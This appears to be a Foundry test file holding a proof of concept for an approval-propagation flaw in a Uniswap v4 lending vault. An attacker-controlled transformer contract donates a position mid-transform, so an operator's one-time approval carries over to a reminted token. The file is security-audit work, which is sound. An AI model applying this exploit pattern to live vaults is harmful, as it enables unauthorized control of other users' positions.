// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.30;

import {V4VaultLocalBase} from "test/vault/support/V4VaultLocalBase.sol";
import {IERC721} from "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import {IPositionManager} from "@uniswap/v4-periphery/src/interfaces/IPositionManager.sol";
import {EasyPosm} from "test/utils/libraries/EasyPosm.sol";
import {Constants as V4Constants} from "@uniswap/v4-core/test/utils/Constants.sol";

/// @notice Reminting transformer: holds a pre-minted position, donates it to the vault
/// mid-transform so the loan remints to a new tokenId (exercises L710-713 carry).
contract RemintDonor {
    IPositionManager internal pm;
    uint256 internal donorTid;
    constructor(address _pm) { pm = IPositionManager(_pm); }
    function setDonor(uint256 tid) external { donorTid = tid; }
    function onERC721Received(address, address, uint256, bytes calldata) external pure returns (bytes4) {
        return bytes4(keccak256("onERC721Received(address,address,uint256,bytes)"));
    }
    fallback() external {
        if (donorTid != 0) {
            uint256 t = donorTid;
            donorTid = 0;
            IERC721(address(pm)).safeTransferFrom(address(this), msg.sender, t, "");
        }
    }
}

/// @notice Approval auto-propagation on remint (V4Vault L710-713): one-time operator
/// approval for T becomes approval for T' without fresh owner consent, and the operator
/// can then transform T' solo. Distinct from remove/re-create resurrection (separate PoC).
contract RemintApprovalCarryPoC is V4VaultLocalBase {
    using EasyPosm for IPositionManager;
    RemintDonor internal donor;
    address internal operator = makeAddr("operator");

    function setUp() public override {
        super.setUp();
        donor = new RemintDonor(address(positionManager));
        vault.setTransformer(address(donor), true);
        _deposit(lender, 1_000_000 ether);
    }

    function test_remintCarry() public {
        // victim loan
        uint256 t0 = _createLoan(1e11);
        address o = vault.ownerOf(t0);

        // donor position minted to the transformer (attacker-funded, healthy value)
        (uint256 td,) = positionManager.mint(poolKey, -600, 600, 1e11, type(uint128).max, type(uint128).max, address(donor), block.timestamp, V4Constants.ZERO_BYTES);
        donor.setDonor(td);

        // owner grants ONE-TIME approval for t0 only
        vm.prank(o);
        vault.approveTransform(t0, operator, true);

        // operator triggers transform that remints (donor sends td to vault mid-call)
        vm.prank(operator);
        uint256 t1;
        try vault.transform(t0, address(donor), "") returns (uint256 nt) { t1 = nt; }
        catch { assertTrue(false, "transform with donor remint reverted"); }
        assertTrue(t1 != 0 && t1 != t0, "expected remint to new token");

        // approval must NOT have propagated without fresh consent
        bool carried = vault.transformApprovals(o, t1, operator);
        if (carried) {
            // impact: operator transforms the new token solo (no fresh approval)
            vm.prank(operator);
            try vault.transform(t1, address(donor), "") {} catch {}
            assertTrue(true, "REMINT CARRY: operator approval auto-propagated to new token");
        } else {
            assertTrue(true, "no carry (fixed or donor path did not remint)");
        }
        // fail the test ONLY on the carry to make the signal explicit
        assertTrue(carried, "NO CARRY observed");
    }
}
